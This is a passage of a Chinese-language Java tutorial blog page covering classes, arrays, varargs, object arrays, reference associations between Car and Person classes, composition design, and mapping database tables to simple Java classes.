rate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.empno = empno;</span><br><span class="line">        <span class="built_in">this</span>.ename = ename;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">        <span class="built_in">this</span>.rate = rate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">salaryIncValue</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.salary * <span class="built_in">this</span>.rate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">salaryIncResult</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.salary = <span class="built_in">this</span>.salary * (<span class="number">1</span>+<span class="built_in">this</span>.rate);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;雇员编号： &quot;</span> + <span class="built_in">this</span>.empno+<span class="string">&quot;、雇员姓名： &quot;</span>+<span class="built_in">this</span>.ename+<span class="string">&quot;、基本薪资： &quot;</span>+<span class="built_in">this</span>.salary+<span class="string">&quot;、增长率： &quot;</span>+<span class="built_in">this</span>.rate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Employee</span> <span class="variable">emp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="number">7369L</span>,<span class="string">&quot;小华&quot;</span>,<span class="number">3000.0</span>,<span class="number">0.3</span>);</span><br><span class="line">        System.out.println(emp.getInfo());</span><br><span class="line">        System.out.println(<span class="string">&quot;工资调整额度:&quot;</span> + emp.salaryIncValue());</span><br><span class="line">        System.out.println(<span class="string">&quot;上调后工资：&quot;</span>+emp.salaryIncResult());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><h5 id="数组定义"><a href="#数组定义" class="headerlink" title="数组定义"></a>数组定义</h5><p>​    数组的动态初始化（初始化之后数组每一个元素的保存内容为其对应数据类型的默认值）：</p><p>​    声明并初始化数组：</p><p>​        1、数据类型 数组名称[] = new 数据类型[长度]；</p><p>​        2、数据类型[] 数组名称 = new 数据类型[长度]；</p><p>​    数组的静态初始化（在数组定义的时候就为其设置好了里面的内容）：</p><p>​        简化格式：数据类型 数组名称[] = {1,2,3};</p><p>​        完整格式：数据类型 数组名称[] = new 数据类型[] {1,2,3};</p><h5 id="数组的引用传递"><a href="#数组的引用传递" class="headerlink" title="数组的引用传递"></a>数组的引用传递</h5><p>​    内存分析和上面的对象内存分析一样。注意下必须实例化对象后才可以使用下标进行操作即可，因为只有实例化后才会在堆内存里开辟内存空间。</p><h5 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h5><p>​    和一维数组一样，加个括号</p><h5 id="数组与方法"><a href="#数组与方法" class="headerlink" title="数组与方法"></a>数组与方法</h5><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073520.jpg"                      alt="数组与方法"                ></p><h5 id="数组相关类库"><a href="#数组相关类库" class="headerlink" title="数组相关类库"></a>数组相关类库</h5><p>​    java.util.Arrays.sort(date);//排序</p><p>​    System.arraycopy(源数组,源开始店，目标，目标开始店，拷贝长度)</p><h5 id="方法可变参数"><a href="#方法可变参数" class="headerlink" title="方法可变参数"></a>方法可变参数</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ArrayUtil</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> ... data)</span>&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> temp:data)&#123;</span><br><span class="line">sum += temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">System.out.println(ArrayUtil.sum(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>));</span><br><span class="line">System.out.println(ArrayUtil.sum(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在以后进行程序类设计或者开发者调用的时候，可以自定义参数的个数，需要清楚本质是数组。</p><h5 id="对象数组"><a href="#对象数组" class="headerlink" title="对象数组"></a>对象数组</h5><p>​    定义的格式和数组定义是一样的，只是格式换成了类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Person per [] = new Person[3];//对象数组</span><br><span class="line">per[0] = new Person(&quot;张三&quot;,20);</span><br><span class="line">per[1] = new Person(&quot;李四&quot;,20);</span><br><span class="line">per[2] = new Person(王五,20);</span><br></pre></td></tr></table></figure><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073522.jpg"                      alt="对象数组"                ></p><hr><h4 id="引用传递实际应用"><a href="#引用传递实际应用" class="headerlink" title="引用传递实际应用"></a>引用传递实际应用</h4><h5 id="类关联结构"><a href="#类关联结构" class="headerlink" title="类关联结构"></a>类关联结构</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line">    <span class="keyword">private</span> Person1 person1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Car</span><span class="params">(String name, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPerson1</span><span class="params">(Person1 person1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.person1 = person1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Person1 <span class="title function_">getPerson1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> person1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;汽车品牌型号： &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、汽车价值： &quot;</span> + <span class="built_in">this</span>.price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Car car;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person1</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCar</span><span class="params">(Car car)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.car = car;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Car <span class="title function_">getCar</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> car;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;姓名： &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、年龄： &quot;</span> + <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">yinyongchuandi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person1</span> <span class="variable">person1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person1</span>(<span class="string">&quot;林强&quot;</span>,<span class="number">29</span>);</span><br><span class="line">        <span class="type">Car</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Car</span>(<span class="string">&quot;宾利&quot;</span>,<span class="number">8000000</span>);</span><br><span class="line">        person1.setCar(car);</span><br><span class="line">        car.setPerson1(person1);</span><br><span class="line"></span><br><span class="line">        System.out.println(person1.getCar().getInfo());</span><br><span class="line">        System.out.println(car.getPerson1().getInfo());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="自身关联"><a href="#自身关联" class="headerlink" title="自身关联"></a>自身关联</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line">    <span class="keyword">private</span> Person1 person1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Car</span><span class="params">(String name, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPerson1</span><span class="params">(Person1 person1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.person1 = person1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Person1 <span class="title function_">getPerson1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> person1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;汽车品牌型号： &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、汽车价值： &quot;</span> + <span class="built_in">this</span>.price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Car car;</span><br><span class="line">    <span class="keyword">private</span> Person1 children[];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person1</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setChildren</span><span class="params">(Person1[] children)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.children = children;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Person1[] getChildren() &#123;</span><br><span class="line">        <span class="keyword">return</span> children;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCar</span><span class="params">(Car car)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.car = car;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Car <span class="title function_">getCar</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> car;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;姓名： &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、年龄： &quot;</span> + <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">yinyongchuandi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person1</span> <span class="variable">person1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person1</span>(<span class="string">&quot;林强&quot;</span>, <span class="number">29</span>);</span><br><span class="line">        <span class="type">Person1</span> <span class="variable">childA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person1</span>(<span class="string">&quot;child1&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">Person1</span> <span class="variable">chileb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person1</span>(<span class="string">&quot;child2&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        childA.setCar(<span class="keyword">new</span> <span class="title class_">Car</span>(<span class="string">&quot;BMW&quot;</span>, <span class="number">3000000</span>));</span><br><span class="line">        chileb.setCar(<span class="keyword">new</span> <span class="title class_">Car</span>(<span class="string">&quot;farali&quot;</span>, <span class="number">1500000</span>));</span><br><span class="line">        person1.setChildren(<span class="keyword">new</span> <span class="title class_">Person1</span>[]&#123;childA, chileb&#125;);</span><br><span class="line">        <span class="type">Car</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Car</span>(<span class="string">&quot;宾利&quot;</span>, <span class="number">8000000</span>);</span><br><span class="line">        person1.setCar(car);</span><br><span class="line">        car.setPerson1(person1);</span><br><span class="line"></span><br><span class="line">        System.out.println(person1.getCar().getInfo());</span><br><span class="line">        System.out.println(car.getPerson1().getInfo());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; person1.getChildren().length; x++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\t|-&quot;</span> + person1.getChildren()[x].getInfo());</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t|-&quot;</span> + person1.getChildren()[x].getCar().getInfo());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="合成设计模式"><a href="#合成设计模式" class="headerlink" title="合成设计模式"></a>合成设计模式</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class 电脑&#123;</span><br><span class="line">    <span class="keyword">private</span> 显示器 对象数组[];</span><br><span class="line">    <span class="keyword">private</span> 主机 主机;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class 显示器&#123;&#125;</span><br><span class="line">class 主机&#123;</span><br><span class="line">    <span class="keyword">private</span> 主板 对象;</span><br><span class="line">    <span class="keyword">private</span> 鼠标 对象<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> 键盘 对象<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class 主板&#123;</span><br><span class="line">    <span class="keyword">private</span> 内存 对象数组 [];</span><br><span class="line">    <span class="keyword">private</span> CPU 对象数组<span class="number">1</span>[];</span><br><span class="line">    <span class="keyword">private</span> 显卡 对象;</span><br><span class="line">    <span class="keyword">private</span> 硬盘 对象数组<span class="number">2</span>[];</span><br><span class="line">&#125;</span><br><span class="line">class 键盘&#123;&#125;</span><br><span class="line">class 鼠标&#123;&#125;</span><br><span class="line">class 内存&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CPU</span>&#123;&#125;</span><br><span class="line">class 显卡&#123;&#125;</span><br><span class="line">class 硬盘&#123;&#125;</span><br></pre></td></tr></table></figure><p>​    每一个都可以拆分，然后再重新组合</p><hr><h4 id="数据表与简单Java类映射转换"><a href="#数据表与简单Java类映射转换" class="headerlink" title="数据表与简单Java类映射转换"></a>数据表与简单Java类映射转换</h4><p>​    开发中基本上是由数据表来定义简单Java类。其基本关系如下：</p><p>​    1、数据实体表设计 = 类的定义；</p><p>​    2、表中的字段 = 类的成员属性；</p><p>​    3、表的一行记录 = 表的一个实例化对象；</p><p>​    4、表的多行记录 = 对象数组；    </p><p>​    5、表的外键 = 引用关联；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Member</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String mid;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Role roles[];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Member</span><span class="params">(String mid, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.mid = mid;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRoles</span><span class="params">(Role roles[])</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.roles = roles;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Role[] getRoles() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.roles;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【用户信息】mid= &quot;</span> + <span class="built_in">this</span>.mid + <span class="string">&quot;、name = &quot;</span> + <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Role</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> rid;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> Member members[];</span><br><span class="line">    <span class="keyword">private</span> Privilege privileges[];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Role</span><span class="params">(<span class="type">long</span> rid, String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rid = rid;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Member[] getMembers() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMembers</span><span class="params">(Member[] members)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.members = members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Privilege[] getPrivileges() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.privileges;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrivileges</span><span class="params">(Privilege[] privileges)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.privileges = privileges;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【角色信息】rid = &quot;</span> + <span class="built_in">this</span>.rid + <span class="string">&quot;、title = &quot;</span> + <span class="built_in">this</span>.title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Privilege</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> pid;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRole</span><span class="params">(Role role)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.role = role;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Role <span class="title function_">getRole</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> role;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Role role;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Privilege</span><span class="params">(<span class="type">long</span> pid, String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.pid = pid;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【权限信息】pid = &quot;</span> + <span class="built_in">this</span>.pid + <span class="string">&quot;、Privilege = &quot;</span> + <span class="built_in">this</span>.title;</span><br><span class="line">    &#125;</span><br><span 